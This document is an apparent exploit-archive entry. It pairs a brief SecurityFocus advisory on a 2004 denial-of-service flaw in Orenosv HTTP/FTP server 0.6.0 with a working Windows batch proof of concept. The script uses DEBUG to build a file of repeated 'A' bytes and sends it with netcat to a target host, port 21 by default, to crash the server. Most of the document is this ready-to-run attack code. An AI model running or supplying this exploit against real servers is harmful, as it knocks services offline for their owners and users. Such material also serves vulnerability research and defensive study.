source: http://www.securityfocus.com/bid/10420/info
  
Orenosv HTTP/FTP server is prone to a denial of service vulnerability that may occur when an overly long HTTP GET request is sent to the server. When the malicious request is handled, it is reported that both the HTTP and FTP daemons will stop responding.

@echo off
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:Application:   Orenosv FTP Server
:Vendors:       http://home.comcast.net/~makataoka//orenosv060.zip
:Version:       <=0.6.0
:Platforms:     Windows
:Bug:           D.O.S
:Date:          2004-06-02
:Author:        CoolICE
:E-mail:        CoolICE#China.com
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;if '%1'=='' echo Usage:%0 target [port]&&goto :eof
;set PORT=21
;if not '%2'=='' set PORT=%2
;for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe
echo Need nc.exe&&goto :eof
;DEBUG < %~s0
;GOTO :run

F 100 200 41
rcx
100
ndos.a
w
q


:run
nc %1 %PORT% < dos.a
del dos.a
